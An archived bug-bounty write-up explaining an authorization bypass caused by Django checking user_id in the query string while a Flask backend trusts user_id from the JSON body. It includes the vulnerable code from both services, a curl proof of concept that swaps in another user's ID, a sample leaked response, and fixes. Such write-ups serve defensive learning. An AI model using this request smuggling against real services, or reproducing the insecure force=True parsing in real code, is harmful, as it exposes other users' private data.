# $5,000 | Authorization Bypass via Parameter Parsing Mismatch (Django — Flask)

- **Source URL:** https://medium.com/@pranshux0x/5-000-authorization-bypass-via-parameter-parsing-mismatch-django-flask-6f0f748db6be?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250821171426/https://medium.com/@pranshux0x/5-000-authorization-bypass-via-parameter-parsing-mismatch-django-flask-6f0f748db6be
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9702 (id 9702)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# $5,000 | Authorization Bypass via Parameter Parsing Mismatch (Django — Flask)

2 min readMay 21, 2025

# Summary

A critical **authorization bypass** was discovered due to inconsistent parameter parsing between the **Django frontend API** and the **Flask internal API**. This allowed an attacker to **access other users’ data** by manipulating the request body, while bypassing Django’s user ownership check.

# Technical Stack

- **Frontend API**: Written in **Django**
- **Backend API (internal service)**: Written in **Flask**
- The frontend `/user` endpoint checks authorization and then proxies the request to Flask for data handling.

# Vulnerable Request

```
GET /user?user_id=1234
Content-Type: application/json
{"user_id": 9999}
```
# Behavior Overview

# Django (Fronted Check):

Django checks the query parameter:

```
user_id = request.GET.get("user_id")
if not owns_user(request.user, user_id):
    return HttpResponse("Unauthorized", status=403)
```
So it checks:

`GET param user_id = 1234 ✅`
Then **forwards the request as-is** to the Flask backend.

# Flask (Backend Parsing):

```
user_id = request.get_json(force=True).get("user_id")
return jsonify(data_for(user_id))
```
Because `force=True`, Flask:

- Uses `user_id = 9999` from body
- Ignores `user_id = 1234` in query params

# Vulnerability Explained

- Django checked `user_id` from query string (`1234`) and allowed it
- But Flask **trusted** **user_id**
 **from JSON body** (`9999`) and returned its data

The attacker effectively **bypassed the frontend authorization check** and accessed **another user’s data**.


# Exploit Steps (PoC)

```
curl -X GET "https://target.com/user?user_id=1234" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 9999}'
```
Response:

```
{
  "user_id_used": 9999,
  "data": "Private data for user 9999"
}
```
# Root Cause

1. **Frontend (Django)** trusts query parameters only.
2. **Backend (Flask)** forcefully parses and trusts body parameters with `force=True`.
3. No consistency between how `user_id` is passed and validated across services.

# Impact

- Full **horizontal privilege escalation**
- Read access to **any user’s data**

# Recommendations

- **NEVER use** **force=True**
- Backend (Flask) should **not trust** body parameters blindly on GET requests.

# Conclusion

This bug demonstrates how **framework differences** (Django vs Flask) in parameter parsing can lead to **serious auth bypasses**.
